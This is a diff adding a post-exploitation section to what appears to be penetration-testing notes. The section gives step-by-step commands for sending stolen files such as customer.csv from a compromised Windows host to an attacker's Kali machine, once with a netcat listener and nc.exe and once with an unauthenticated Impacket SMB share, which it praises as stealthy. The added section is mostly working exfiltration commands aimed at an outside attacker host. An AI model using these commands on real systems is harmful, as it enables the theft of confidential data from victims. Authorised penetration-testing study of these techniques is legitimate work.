@@ -198,3 +198,42 @@ $ free -h
 # Network Interfaces
 $ ip -brief address show
 ```
+# Post-Exploitation: Data Exfiltration (Windows to Linux)
+
+During the post-exploitation phase, extracting sensitive data (e.g., `customer.csv`, configuration files, or database dumps) from a compromised Windows host to the attacker's Kali Linux machine is a critical objective. Below are two highly effective methodologies.
+
+## Method 1: The Netcat Pipeline (TCP Exfiltration)
+If a valid Windows PE Netcat binary (`nc.exe`) is already staged on the target, it can be utilized for seamless data transfer over pure TCP.
+
+**Step 1: Prepare the Listener (Kali Linux - Receiver)**
+Set up Netcat to listen on a designated port and redirect the incoming stream into an empty file.
+```bash
+# Execute on the attacker machine
+nc -lvnp 9001 > customer.csv
+```
+
+**Step 2: Push the File (Windows Target - Sender)**
+From the compromised Windows shell (CMD), pipe or redirect the target file's contents into the Netcat connection.
+```cmd
+# Execute on the compromised Windows host
+C:\Temp\nc.exe <KALI_IP> 9001 < customer.csv
+```
+*(Note: Press `Ctrl+C` on the Kali listener after a few seconds once the file transfer is complete).*
+
+## Method 2: SMB Share via Impacket (Living off the Land)
+This is the most reliable and stealthy method, as it leverages the native Windows SMB protocol (Server Message Block). By hosting a rogue SMB share on the attacker machine, we can exfiltrate files using standard Windows `copy` commands.
+
+**Step 1: Host the SMB Server (Kali Linux)**
+Use the Impacket library to create an unauthenticated SMB share pointing to your current working directory. The `-smb2support` flag is mandatory for compatibility with modern Windows environments (Windows 10/Server 2016+).
+```bash
+# Execute on the attacker machine
+sudo impacket-smbserver exfil $(pwd) -smb2support
+```
+
+**Step 2: Copy the File (Windows Target)**
+Treat the attacker machine as a standard network drive and copy the file directly. No authentication is required.
+```cmd
+# Execute on the compromised Windows host
+copy customer.csv \\<KALI_IP>\exfil\
+```
+*(Result: The file will appear instantly in your Kali working directory, and the Impacket terminal will log the successful connection).*
